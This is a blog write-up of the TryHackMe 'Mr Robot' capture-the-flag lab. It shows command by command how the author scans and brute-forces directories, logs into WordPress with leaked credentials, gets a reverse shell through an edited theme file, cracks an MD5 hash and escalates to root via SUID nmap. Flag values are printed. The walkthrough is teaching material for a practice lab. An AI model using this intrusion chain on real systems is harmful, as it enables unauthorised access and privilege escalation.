---
tagline: mrrobotctf
title: Mr Robot CTF [Writeup]
description: One of the top-tier challenges on TryHackMe, revered as a GOAT in THM Machines.
banner: /blog/mrrobotctfbanner.jpeg/
banner_alt: redrum redrum all we know is redrum
date: '2024-03-3'
---

## Foreword

I've come to understand that many people don't grasp my write-ups due to a knowledge gap. Therefore, I'll be explaining every step along the way. Hope you enjoy as I s!

## Nmap Scan

- What is Nmap? Nmap is a tool used for checking open ports in a server. This is typically the first step when tackling a machine. Below is the command I will be using.

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.199.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 23:06 EST
Nmap scan report for 10.10.199.158
Host is up (0.097s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.96 seconds
```

- We now know that there is a closed SSH port, an open HTTP port indicating the presence of a website accessible through a browser, and port 443 running both SSL and HTTP.

## Accessing the website

![Image showing the website](/blog/mrrobotctf/website.png 'Fig.1')

- Damn, for a machine the website is well built. After some poking and prodding, I don't seem to see anything on the homepage. Next step is a Dirsearch.

## Dirsearch

_ A Directory Search involves brute-forcing to discover existing directories, helping you understand your attack surface.

```bash:Terminal
──(vipin㉿vipin)-[~]
└─$ dirsearch -u 10.10.199.158 --exclude-status 301,400,403,404,408
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                      
 (_||| _) (/_(_|| (_| )                                                                               
                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/vipin/reports/_10.10.199.158/_24-03-03_00-09-46.txt

Target: https://10.10.199.158/

[00:09:47] Starting:                                                                                  
[00:11:37] 302 -    0B  - /dashboard  ->  https://10.10.199.158/wp-admin/   
[00:11:37] 302 -    0B  - /dashboard/  ->  https://10.10.199.158/wp-admin/  
[00:11:51] 200 -    0B  - /favicon.ico                                      
[00:12:10] 200 -  504KB - /intro                                            
[00:12:15] 200 -  158B  - /license                                          
[00:12:15] 200 -  158B  - /license.txt                                      
[00:12:18] 302 -    0B  - /login  ->  https://10.10.199.158/wp-login.php    
[00:12:18] 302 -    0B  - /login/  ->  https://10.10.199.158/wp-login.php   
[00:12:55] 200 -   64B  - /readme                                           
[00:12:55] 200 -   64B  - /readme.html                                      
[00:12:58] 200 -   41B  - /robots.txt                                       
[00:13:08] 200 -    0B  - /sitemap                                          
[00:13:08] 200 -    0B  - /sitemap.xml.gz                                   
[00:13:08] 200 -    0B  - /sitemap.xml
[00:13:39] 302 -    0B  - /wp-admin/  ->  https://10.10.199.158/wp-login.php?redirect_to=https%3A%2F%2F10.10.199.158%2Fwp-admin%2F&reauth=1
[00:13:39] 200 -   21B  - /wp-admin/admin-ajax.php
[00:13:39] 500 -    3KB - /wp-admin/setup-config.php
[00:13:40] 200 -    0B  - /wp-config.php                                    
[00:13:40] 200 -    0B  - /wp-content/                                      
[00:13:41] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[00:13:41] 500 -    0B  - /wp-content/plugins/hello.php                     
[00:13:41] 500 -    0B  - /wp-includes/rss-functions.php                    
[00:13:41] 200 -    1KB - /wp-login                                         
[00:13:41] 200 -    1KB - /wp-login.php
[00:13:41] 200 -    1KB - /wp-login/                                        
[00:13:41] 302 -    0B  - /wp-signup.php  ->  https://10.10.199.158/wp-login.php?action=register
[00:13:41] 200 -    0B  - /wp-cron.php                                      
[00:13:43] 405 -   42B  - /xmlrpc                                           
[00:13:43] 405 -   42B  - /xmlrpc.php
                                                                             
Task Completed
```

## Key 1

- Looking through all the directories, *robots.txt* has the first key for us

![Image showing the robots.txt](/blog/mrrobotctf/robotstxt.png 'Fig.2')

## Key 2

- When we look in */license*, we find the string "ZWxsaW90OkVSMjgtMDY1Mgo=" which seems to be base64

![Image showing the output](/blog/mrrobotctf/base64output.png 'Fig.3')

- Lets login with that in */login*

![Image showing we r in](/blog/mrrobotctf/dashboard.png 'Fig.4')

- And we are in! Lets exploit it.

- I started by using the same reverse shell script I used in [RootMe](https://www.vipinb.xyz/blog/rootme#obtaining-the-user-flag) and editing a random theme file with the php code and I got user access!

```bash:Terminal
daemon@linux:/$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

- Ruh roh, can't go in. Lets crack that password though.

![Image showing cracked password](/blog/mrrobotctf/hashcracked.png 'Fig.5')

```bash:Terminal
daemon@linux:/$ su robot
su robot
su: must be run from a terminal
daemon@linux:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz             
```

- And I did get the flag!

## Key 3

- I ran ```find / -user root -perm -4000 -exec ls -ldb {} \;``` to see exploitable SUID Binaries and nmap was one. Using GTFOBINS I found that you can run ```nmap --interactive``` and say ```!sh``` to get a shell. 

```bash:Terminal
robot@linux:/$ nmap --interactive               
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
# cd root
cd root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

![My Tryhackme badge yuh](https://tryhackme-badges.s3.amazonaws.com/vipin.b.png)